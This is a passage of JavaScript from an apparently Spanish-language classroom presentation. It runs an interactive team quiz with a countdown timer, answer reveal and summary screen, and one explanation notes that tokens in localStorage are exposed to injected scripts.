        'Aumentar la memoria del dispositivo y mover el token a <code>sessionStorage</code>.',
        'Cargar el JavaScript dos veces para que la segunda ejecución sea más rápida.'
      ],
      correct: 1,
      explain: 'Un bloqueo de 800 ms impide pintar y responder al toque, así que el INP sube mucho más del objetivo de 200 ms. Hay que partir las tareas largas y devolver el control al navegador; un spinner solo disimula el problema. <code>localStorage</code> es legible por cualquier script inyectado (XSS), mientras que una cookie <code>HttpOnly</code> no se expone a JavaScript.'
    }
  ];

  var quizState = { index: 0, revealed: false };
  var quizBody = $('#quizBody');
  var quizBarFill = $('#quizBarFill');
  var quizProgressChip = $('#quizProgressChip');
  var quizHeadingFocus = null;

  var timer = { remaining: QUESTION_SECONDS, endAt: 0, id: null, running: false };

  function twoDigits(n) { return (n < 10 ? '0' : '') + n; }
  function clockText(seconds) {
    return twoDigits(Math.floor(seconds / 60)) + ':' + twoDigits(seconds % 60);
  }

  function paintTimer() {
    var ring = $('#timerRing');
    var text = $('#timerText');
    var card = $('#timerCard');
    if (!ring || !text) { return; }
    var circumference = 2 * Math.PI * 34;
    ring.style.strokeDasharray = circumference.toFixed(1);
    ring.style.strokeDashoffset = (circumference * (1 - timer.remaining / QUESTION_SECONDS)).toFixed(1);
    text.textContent = clockText(timer.remaining);
    if (card) {
      card.classList.toggle('is-low', timer.remaining <= 20 && timer.remaining > 10);
      card.classList.toggle('is-critical', timer.remaining <= 10);
    }
    var toggle = $('#timerToggle');
    if (toggle) { toggle.textContent = timer.running ? 'Pausar' : 'Reanudar'; }
  }

  function stopTicker() {
    if (timer.id) { clearInterval(timer.id); timer.id = null; }
    timer.running = false;
  }

  function announceTimer(message) {
    var status = $('#timerStatus');
    if (status) { status.textContent = message; }
  }

  function startTimer(seconds) {
    stopTicker();
    timer.remaining = typeof seconds === 'number' ? seconds : QUESTION_SECONDS;
    timer.endAt = Date.now() + timer.remaining * 1000;
    timer.running = true;
    var banner = $('#timeUp');
    if (banner) { banner.hidden = true; }
    var note = $('#timerNote');
    if (note) { note.textContent = 'Discutan y anoten'; }
    var toggle = $('#timerToggle');
    if (toggle) { toggle.disabled = false; }
    paintTimer();
    timer.id = setInterval(tickTimer, 200);
  }

  function tickTimer() {
    if (!timer.running) { return; }
    var left = Math.max(0, Math.ceil((timer.endAt - Date.now()) / 1000));
    if (left !== timer.remaining) {
      timer.remaining = left;
      paintTimer();
    }
    if (left <= 0) { expireTimer(); }
  }

  function expireTimer() {
    stopTicker();
    timer.remaining = 0;
    paintTimer();
    var toggle = $('#timerToggle');
    if (toggle) { toggle.disabled = true; }
    var note = $('#timerNote');
    if (note) { note.textContent = 'Tiempo cumplido'; }
    var banner = $('#timeUp');
    if (banner) { banner.hidden = false; }
    var hint = $('#quizHint');
    if (hint) { hint.textContent = 'Tiempo terminado. Lean sus anotaciones y pulsa «Mostrar respuesta».'; }
    announceTimer('¡Tiempo terminado! Levanten sus cuadernos.');
  }

  function toggleTimer() {
    if (quizState.revealed) { return; }
    var toggle = $('#timerToggle');
    if (timer.running) {
      timer.remaining = Math.max(0, Math.ceil((timer.endAt - Date.now()) / 1000));
      stopTicker();
      paintTimer();
      if (toggle) { toggle.textContent = 'Reanudar'; }
      announceTimer('Cronómetro en pausa. Quedan ' + timer.remaining + ' segundos.');
      return;
    }
    if (timer.remaining <= 0) { return; }
    timer.endAt = Date.now() + timer.remaining * 1000;
    timer.running = true;
    paintTimer();
    timer.id = setInterval(tickTimer, 200);
    announceTimer('Cronómetro reanudado.');
  }

  function restartTimer() {
    if (quizState.revealed) { return; }
    startTimer(QUESTION_SECONDS);
    announceTimer('Cronómetro reiniciado en ' + QUESTION_SECONDS + ' segundos.');
  }

  function updateQuizChrome() {
    var shown = quizState.index + (quizState.revealed ? 1 : 0);
    quizBarFill.style.width = ((shown / QUESTIONS.length) * 100) + '%';
    quizProgressChip.textContent = 'Pregunta ' + Math.min(quizState.index + 1, QUESTIONS.length) + ' de ' + QUESTIONS.length;
  }

  function optionMarkup(option, i) {
    return '<li class="option">' +
      '<span class="opt-key" aria-hidden="true">' + LETTERS[i] + '</span>' +
      '<span class="opt-body">' + option + '</span>' +
      '<span class="opt-flag">' +
      '<svg class="ic" viewBox="0 0 24 24" aria-hidden="true"><use href="#i-check"></use></svg>' +
      '<span class="sr-only">Respuesta correcta</span>' +
      '</span></li>';
  }

  function renderQuestion() {
    stopTicker();
    quizState.revealed = false;
    var q = QUESTIONS[quizState.index];
    var html = '<div class="quiz-q">' +
      '<div class="q-head">' +
      '<div class="q-head-main">' +
      '<p class="q-tag"><span class="q-num">Pregunta ' + (quizState.index + 1) + ' de ' + QUESTIONS.length + '</span><span>' + q.tag + '</span></p>' +
      '<h2 id="quizQTitle" tabindex="-1">' + q.title + '</h2>' +
      '</div>' +
      '<div class="timer-card" id="timerCard" role="group" aria-label="Cronómetro de la pregunta: ' + QUESTION_SECONDS + ' segundos">' +
      '<svg class="timer-ring" viewBox="0 0 84 84" aria-hidden="true">' +
      '<circle class="t-track" cx="42" cy="42" r="34"/>' +
      '<circle class="t-fill" id="timerRing" cx="42" cy="42" r="34"/>' +
      '<text id="timerText" x="42" y="48" text-anchor="middle">' + clockText(QUESTION_SECONDS) + '</text>' +
      '</svg>' +
      '<div class="timer-side">' +
      '<p class="timer-cap" id="timerNote">Discutan y anoten</p>' +
      '<div class="timer-btns">' +
      '<button type="button" class="mini-btn" id="timerToggle">Pausar</button>' +
      '<button type="button" class="mini-btn" id="timerReset">Reiniciar</button>' +
      '</div></div></div></div>' +
      '<div class="time-up" id="timeUp" role="alert" hidden>' +
      '<svg class="ic" aria-hidden="true"><use href="#i-alert"></use></svg>' +
      '<span><strong>¡Tiempo terminado!</strong> Levanten sus cuadernos.</span></div>' +
      '<ol class="options" aria-labelledby="quizQTitle">' +
      q.options.map(optionMarkup).join('') +
      '</ol>' +
      '<div id="answerSlot"></div>' +
      '<div class="quiz-actions">' +
      '<p class="micro muted" id="quizHint">Lean las 4 opciones, discutan en equipo y anoten su respuesta.</p>' +
      '<div class="quiz-cta">' +
      '<button type="button" class="btn btn-primary" id="revealBtn">' +
      '<svg class="ic" aria-hidden="true"><use href="#i-eye"></use></svg> Mostrar respuesta</button>' +
      '<button type="button" class="btn btn-ghost" id="quizNext" hidden>Siguiente pregunta</button>' +
      '</div></div></div>' +
      '<p class="sr-only" id="timerStatus" aria-live="polite"></p>';
    quizBody.innerHTML = html;
    updateQuizChrome();
    var title = $('#quizQTitle');
    if (title) { title.focus({ preventScroll: true }); }
    window.scrollTo(0, 0);
    startTimer(QUESTION_SECONDS);
  }

  function revealAnswer() {
    if (quizState.revealed) { return; }
    quizState.revealed = true;
    stopTicker();
    var q = QUESTIONS[quizState.index];

    $$('.option', quizBody).forEach(function (el, i) {
      if (i === q.correct) { el.classList.add('is-correct'); }
      else { el.classList.add('is-dim'); }
    });

    var toggle = $('#timerToggle');
    var reset = $('#timerReset');
    if (toggle) { toggle.disabled = true; }
    if (reset) { reset.disabled = true; }
    var note = $('#timerNote');
    if (note) { note.textContent = 'Tiempo detenido'; }

    var slot = $('#answerSlot');
    if (slot) {
      slot.innerHTML = '<div class="explain good answer-card" role="status" tabindex="-1">' +
        '<div class="ex-title">' +
        '<svg class="ic" aria-hidden="true"><use href="#i-check"></use></svg>' +
        'Respuesta correcta: ' + LETTERS[q.correct] + '</div>' +
        '<p>' + q.explain + '</p>' +
        '<p class="answer-tip">Comenten con el grupo por qué las otras opciones no resuelven el caso.</p>' +
        '</div>';
      var card = $('.answer-card', slot);
      if (card) {
        card.focus({ preventScroll: true });
        if (typeof card.scrollIntoView === 'function') {
          var reduce = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
          card.scrollIntoView({ block: 'nearest', behavior: reduce ? 'auto' : 'smooth' });
        }
      }
    }

    var revealBtn = $('#revealBtn');
    if (revealBtn) { revealBtn.hidden = true; }
    var nextStep = $('#quizNext');
    if (nextStep) {
      nextStep.hidden = false;
      nextStep.textContent = quizState.index === QUESTIONS.length - 1 ? 'Finalizar dinámica' : 'Siguiente pregunta';
    }
    var hint = $('#quizHint');
    if (hint) { hint.textContent = 'Respuesta revelada. Comenten la explicación antes de continuar.'; }
    announceTimer('Respuesta correcta: ' + LETTERS[q.correct] + '.');
    updateQuizChrome();
  }

  function nextQuestion() {
    if (!quizState.revealed) { return; }
    if (quizState.index >= QUESTIONS.length - 1) { renderSummary(); return; }
    quizState.index += 1;
    renderQuestion();
  }

  function renderSummary() {
    stopTicker();
    var html = '<div class="quiz-q">' +
      '<p class="q-tag"><span class="q-num">Dinámica completada</span><span>5 bloques · 5 preguntas</span></p>' +
      '<h2 tabindex="-1" id="quizResultTitle">Respuestas de la actividad</h2>' +
      '<p class="quiz-scenario">Cada equipo puede comparar sus anotaciones con esta hoja. No hay puntuación: el objetivo es discutir el porqué de cada respuesta.</p>' +
      '<div class="result-list" aria-label="Respuestas correctas">';
    QUESTIONS.forEach(function (q, i) {
      html += '<div class="result-item ok">' +
        '<span class="ri-key">' + twoDigits(i + 1) + '</span>' +
        '<span class="ri-tag">' + q.tag + '</span>' +
        '<span class="ri-mark">Respuesta ' + LETTERS[q.correct] + '</span></div>';
    });
    html += '</div>' +
      '<p class="micro muted" style="margin-top:10px">La guía completa para el equipo expositor está en <code>respuestas-quiz.md</code>.</p>' +
      '<div class="quiz-actions">' +
      '<button type="button" class="btn btn-primary" id="quizRestart">' +
      '<svg class="ic" aria-hidden="true"><use href="#i-refresh"></use></svg> Reiniciar dinámica</button>' +
      '<button type="button" class="btn btn-ghost" id="quizHome">' +
      '<svg class="ic" aria-hidden="true"><use href="#i-arrow"></use></svg> Regresar a la presentación</button>' +
      '</div></div>';
    quizBody.innerHTML = html;
    quizBarFill.style.width = '100%';
    quizProgressChip.textContent = 'Dinámica completada';
    var title = $('#quizResultTitle');
    if (title) { title.focus({ preventScroll: true }); }
  }

  function resetQuiz() {
    quizState = { index: 0, revealed: false };
    renderQuestion();
  }

  function openQuiz() {
    quizOpen = true;
    quizHeadingFocus = $('#quizStartBtn') || document.activeElement;
    stopTicker();
    quizView.hidden = false;
    quizView.setAttribute('aria-hidden', 'false');
    document.documentElement.style.setProperty('--accent', '#5856D6');
    resetQuiz();
    stage.hidden = true;
    window.scrollTo(0, 0);
  }

  function closeQuiz() {
    stopTicker();
    quizOpen = false;
    stage.hidden = false;
    render(current);
    if (quizHeadingFocus && typeof quizHeadingFocus.focus === 'function') {
      quizHeadingFocus.focus({ preventScroll: true });
    }
    /* Si el disparador quedó inerte (por ejemplo, otra diapositiva activa),
       devolvemos el foco a un control visible del deck. */
    if (document.activeElement === document.body || quizView.contains(document.activeElement)) {
      var fallback = !nextBtn.disabled ? nextBtn : prevBtn;
      if (fallback) { fallback.focus({ preventScroll: true }); }
    }
    quizView.hidden = true;
    quizView.setAttribute('aria-hidden', 'true');
  }

  quizBody.addEventListener('click', function (e) {
    if (e.target.closest('#timerToggle')) { toggleTimer(); return; }
    if (e.target.closest('#timerReset')) { restartTimer(); return; }
    if (e.target.closest('#revealBtn')) { revealAnswer(); return; }
    if (e.target.closest('#quizNext')) { nextQuestion(); return; }
    if (e.target.closest('#quizRestart')) { resetQuiz(); return; }
    if (e.target.closest('#quizHome')) { closeQuiz(); }
  });

  var quizBack = $('#quizBack');
  if (quizBack) { quizBack.addEventListener('click', closeQuiz); }
  var quizStartBtn = $('#quizStartBtn');
  if (quizStartBtn) { quizStartBtn.addEventListener('click', openQuiz); }


  /* ==========================================================
     INICIALIZACIÓN
     ========================================================== */
  render(0);
  deck.style.transform = 'translateX(0%)';
})();
